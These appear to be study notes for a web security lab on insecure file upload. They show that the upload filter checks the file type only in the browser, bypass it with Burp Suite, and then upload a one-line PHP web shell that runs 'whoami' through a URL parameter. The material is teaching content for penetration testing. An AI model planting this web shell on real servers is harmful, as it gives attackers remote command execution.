## Insecure File Upload - Basic Bypass
- Access the first Insecure file upload lab
- Has a file upload
- Looks like it will show us uploaded files

### Normal App Functionality
- *The better you understand a web application, the easier it is you're going to be able to find and exploit vulnerabilities*
- Let's try uploading a txt file.
- The app has a pop up that says 'Only '.jpg' and '.png' files are allowed.'
- Do it again but watching the network in the dev tools
- There is no request made so the app is not making a check with the server
- Everything is happening on the client side
- Even if the check does happen, we have control over the client
- That means, for example, we could disable JS so the check doesn't happen
- Or, we could intercept the request and change the file type

### Try Inputs for Different Behavior
- Capture the request and response of uploading an image with Burpsuite
- Send the request to the repeater
- Replace the image data with 'hello there' and the file extention to '.txt'
- Sending the request the server responds with a 200 and it uploads the txt file, verified by nagivating to `/uplaods/logo.txt`
- The check is only happening in the client currently but there may be other checks
- For example, there could be a block list that is blocking things like PHP files
- This will require further testing
- Client side controls are great for usability and accessibility, are not good for security

### PHP Web Shell
- Replace 'hello there' with `<?php system($_GET['cmd']); ?>`
- `$_GET` is a super global, which gets the value of the parameter and `system` is a function that will execute it
- Change the file extention to `.php` and send the request
- Navigate to the file `/uplaods/cmd.php` and then append the parameter `?cmd=whoami`

  ![image](https://github.com/user-attachments/assets/681ffbad-7a19-45d6-941f-5e736857590e)






